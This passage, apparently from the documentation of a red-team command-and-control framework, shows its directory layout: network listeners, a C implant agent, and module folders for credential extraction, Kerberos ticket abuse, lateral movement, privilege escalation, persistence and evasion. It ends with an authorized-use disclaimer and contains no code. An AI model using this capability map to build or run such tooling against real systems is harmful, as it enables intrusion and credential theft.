│   ├── listeners/             HTTPS, SMB, DNS listeners
│   ├── crypto/                AES-GCM, ECDH, RSA, nonce management
│   ├── protocol/              TLV, packet framing, argument packing
│   ├── formatters/            Output parsing and table rendering
│   ├── profiles/              Malleable profile parser
│   └── logging/               JSONL operator/agent/traffic logging
├── agent_c/                   C agent source
│   ├── include/               All header files
│   ├── src/                   All implementation files (31 .c files)
│   └── Makefile               Cross-compilation with MinGW-w64
├── modules/                   BOF + Assembly module library
│   ├── enumeration/           AD reconnaissance modules
│   ├── credentials/           Credential extraction modules
│   ├── tickets/               Kerberos ticket manipulation
│   ├── lateral_movement/      Remote execution modules
│   ├── privesc/               Privilege escalation
│   ├── persistence/           Persistence mechanisms
│   └── evasion/               Runtime evasion modules
├── profiles/                  Malleable C2 profiles
├── scripts/                   Build and utility scripts
├── keys/                      RSA keypair (generated)
├── certs/                     TLS certificates
└── logs/                      Operator and traffic logs
```

---

## 18. Legal Disclaimer

This framework is designed exclusively for authorized penetration testing, red team engagements, and security assessments conducted under explicit written permission. Unauthorized use against systems you do not own or have authorization to test is illegal and unethical. The developers assume no liability for misuse.
